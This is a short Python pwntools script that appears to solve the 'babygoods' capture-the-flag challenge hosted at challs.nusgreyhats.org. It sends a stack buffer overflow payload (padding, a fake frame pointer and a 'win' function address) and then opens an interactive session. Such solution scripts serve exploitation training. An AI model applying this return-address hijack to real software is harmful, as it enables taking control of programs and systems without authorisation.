#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./distribution/babygoods", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc challs.nusgreyhats.org 32345"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""

win = elf.sym["sub_15210123"]

io = start()

io.sendlineafter(b"name: ", b"A")
io.sendlineafter(b"Input: ", b"1")
io.sendlineafter(b"(1-5): ", b"3")
payload = flat(b"A" * 0x20, elf.bss(0xC00), win)
io.sendlineafter(b"name: ", payload)

io.interactive()
